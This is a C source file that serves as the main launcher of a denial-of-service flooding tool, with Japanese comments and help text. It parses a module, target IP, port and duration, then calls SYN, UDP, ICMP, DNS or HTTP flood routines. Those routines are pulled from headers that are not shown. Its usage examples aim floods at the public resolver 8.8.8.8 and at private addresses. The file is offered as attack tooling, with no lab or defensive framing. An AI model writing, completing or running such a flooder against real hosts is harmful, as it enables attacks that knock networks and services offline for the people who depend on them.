#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>

#include "modules/syn_flood.h"
#include "modules/udp_flood.h"
#include "modules/icmp_flood.h"
#include "modules/dns_flood.h"
#include "modules/http_flood.h"

// ============================
// ヘルプ表示
// ============================
void print_help(const char *prog) {
    printf("\nUsage: %s -m <module> -t <target> [-p <port>] -d <duration>\n\n", prog);
    printf("Modules:\n");
    printf("  syn     SYN Flood\n");
    printf("  udp     UDP Flood\n");
    printf("  icmp    ICMP Echo Flood\n");
    printf("  dns     DNS Query Flood\n");
    printf("  http    HTTP GET Flood\n\n");

    printf("Options:\n");
    printf("  -m <module>    攻撃モジュール名\n");
    printf("  -t <target>    対象IPアドレス\n");
    printf("  -p <port>      ポート番号 (SYN / UDP / HTTP 用)\n");
    printf("  -d <duration>  攻撃時間（秒）\n");
    printf("  -h             このヘルプを表示\n\n");

    printf("Examples:\n");
    printf("  %s -m syn -t 192.168.1.10 -p 80 -d 10\n", prog);
    printf("  %s -m udp -t 10.0.0.5 -p 53 -d 5\n", prog);
    printf("  %s -m icmp -t 8.8.8.8 -d 3\n", prog);
    printf("  %s -m dns -t 8.8.8.8 -d 10\n", prog);
    printf("  %s -m http -t 192.168.1.20 -p 80 -d 10\n\n", prog);
}

int main(int argc, char *argv[]) {

    // -h があるか調べる
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0) {
            print_help(argv[0]);
            return 0;
        }
    }

    if (argc < 5) {
        print_help(argv[0]);
        return 1;
    }

    char *module = NULL;
    char *target = NULL;
    int   port = 0;
    int   duration = 0;

    // ============================
    // 引数パース
    // ============================
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-m") == 0)      module = argv[++i];
        else if (strcmp(argv[i], "-t") == 0) target = argv[++i];
        else if (strcmp(argv[i], "-p") == 0) port = atoi(argv[++i]);
        else if (strcmp(argv[i], "-d") == 0) duration = atoi(argv[++i]);
    }

    if (!module || !target || duration <= 0) {
        print_help(argv[0]);
        return 1;
    }

    // ============================
    // モジュール実行
    // ============================
    if      (strcmp(module, "syn")  == 0) syn_flood(target, port, duration);
    else if (strcmp(module, "udp")  == 0) udp_flood(target, port, duration);
    else if (strcmp(module, "icmp") == 0) icmp_flood(target, duration);
    else if (strcmp(module, "dns")  == 0) dns_flood(target, duration);
    else if (strcmp(module, "http") == 0) http_flood(target, port, duration);
    else {
        printf("Unknown module: %s\n\n", module);
        print_help(argv[0]);
    }

    return 0;
}
